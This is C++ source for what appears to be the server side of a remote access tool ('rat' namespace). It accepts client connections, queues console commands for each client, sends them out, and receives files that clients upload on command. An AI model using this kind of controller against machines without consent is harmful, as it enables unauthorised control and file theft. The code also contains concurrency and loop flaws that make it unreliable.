#include "server.h"

namespace rat{

std::mutex Server::mt;

std::map< std::string, std::queue<ServerCmd>, std::less<> > ServerInput::server_request_map_;

int Server::CreateLocalServer()
{
    int i_result;
	struct addrinfo* result = 0;

	// Initialize Winsock
	#ifdef _WIN32
	WSADATA wsaData;
	i_result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (i_result != 0) {
		return i_result;
	}
	#endif

	struct addrinfo hints;
	std::memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	i_result = getaddrinfo(0, &(std::to_string(kDefaultPort))[0], &hints, &result);
	if (i_result != 0) {
		goto CREATE_FAIL;
	}

	// Create a SOCKET for the server to listen for client connections.
	listen_socket_ = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listen_socket_ == INVALID_SOCKET) {
		freeaddrinfo(result);
		goto CREATE_FAIL;
	}

	// Setup the TCP listening socket
	i_result = bind(listen_socket_, result->ai_addr, (int)result->ai_addrlen);
	if (i_result == SOCKET_ERROR) {
		freeaddrinfo(result);
		#ifdef _WIN32
			closesocket(listen_socket_);
		#elif __linux__
			close(listen_socket_);
		#endif
		goto CREATE_FAIL;
	}

	freeaddrinfo(result);
    return 0;

	CREATE_FAIL:
		#ifdef _WIN32
			WSACleanup();
			return WSAGetLastError();
		#elif __linux__
			return i_result;
		#endif

}

int Server::Listen()
{
	if (listen_socket_ == 0) return -1;
	if (listen(listen_socket_, 0x7fffffff) == SOCKET_ERROR) {
		Clean();
		return -1;
	}
	return 0;
}

void Server::SetMaxClient(int n_clients)
{
    max_client_ = n_clients;
}

unsigned long long Server::GetListenSocket()
{
	return listen_socket_;
}

int Server::GetMaxClient()
{
	return max_client_;
}


void Server::Clean()
{
    listen_socket_ = INVALID_SOCKET;
    #ifdef _WIN32
    WSACleanup();
    #endif
}

void ServerInput::TakeUserInput()
{
	while(true){
		std::string command;
		std::getline(std::cin, command);
		if (command.empty()) continue;
		if (command.back() == '\n')
		{
			command.pop_back();
		}
		if (command.size() > (size_t)900){
            Server::mt.lock();
			std::cout << "The command is too long, please try agian." << std::endl;
            Server::mt.unlock();
		}
        if (command.size() >= 4 && command.starts_with("exit"))
        {
			return;
        }
        ServerCmd cmd(command);
        if (cmd.GetType() == -1)
        {
            continue;
        } 
        std::string addr = cmd.GetIpAddress() + ":" + std::to_string(cmd.GetPort());
        if (ServerInput::server_request_map_.contains(addr))
        {
            ServerInput::server_request_map_[addr].push(cmd);
        }
    }
	return;
}

HandleConnections::HandleConnections(unsigned long long listen_socket, int max_clients)
{
	listen_socket_ = listen_socket;
	max_clients_ = max_clients;
}

void HandleConnections::AcceptConnections()
{
    if (listen_socket_ == 0)
    {
        return;
    }
	while (true) {
        if (ServerInput::server_request_map_.size() >= max_clients_)
        {
            continue;
        }
		sockaddr_in client_addr{};
		#ifdef _WIN32
			int addrLen = sizeof(client_addr);
			unsigned long long client_socket = accept(listen_socket_, reinterpret_cast<sockaddr*>(&client_addr), &addrLen);
		#elif __linux__
			socklen_t addrLen = static_cast<socklen_t>(sizeof(client_addr));
			unsigned long long client_socket = accept(listen_socket_, reinterpret_cast<sockaddr*>(&client_addr), &addrLen);
		#endif
		if (client_socket != INVALID_SOCKET) {
			std::jthread backgroundThread(&HandleClient::ControlClient, HandleClient(client_socket, client_addr));
			//backgroundThread.detach();
		}
	}

}

HandleClient::HandleClient(unsigned long long client_socket, sockaddr_in client_addr)
{
	client_socket_ = client_socket;
	std::string ip_addr;
	ip_addr.resize((long long)20);
	ip = inet_ntop(AF_INET, &client_addr.sin_addr, &ip_addr[0], 20);
	port = std::to_string(htons(client_addr.sin_port));
	address = ip + ":" + port;
	Server::mt.lock();
	std::cout << "Client connected: " << address << std::endl;
    ServerInput::server_request_map_[address] = std::queue<ServerCmd>();
	Server::mt.unlock();
}

void HandleClient::ControlClient()
{
	if (client_socket_ == 0)
	{
		return;
	}
	TcpSocket sock(client_socket_);

	while(true){
		sock.SafeSend("", 0);
		if (sock.Disconnected())
		{
			break;
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(200));
        ServerCmd server_cmd = WaitForRequest(address);
		if (server_cmd.GetType() == -1) {
			continue;
		}
		sock.SendBytes(server_cmd.ToTcpPacket());
		if (server_cmd.GetType() == static_cast<int>(rat::Command::CommandType::kClientSendFile))
		{
			std::string file_name = std::filesystem::path(server_cmd.GetArgument()).filename().string();
			File f(file_name);
			f.RecvFileThroughSocket(sock);
		}
	}

	Server::mt.lock();
    ServerInput::server_request_map_.erase(address);
	std::cout << "Client disconnected: " << address << std::endl;
	Server::mt.unlock();
	return;

}


ServerCmd HandleClient::WaitForRequest(std::string address)
{
	Server::mt.lock();
	auto it = ServerInput::server_request_map_.find(address);
	if (it == ServerInput::server_request_map_.end()) {
		Server::mt.unlock();
		return ServerCmd();
	}
	std::queue<ServerCmd>& my_queue = it->second;
	long long queue_sz = my_queue.size();
	Server::mt.unlock();

    // If client has request from the server.
	if (queue_sz > 0) {
		Server::mt.lock();
		ServerCmd s = my_queue.front();
		my_queue.pop();
		Server::mt.unlock();
		return s;
	}
	return ServerCmd();

}

}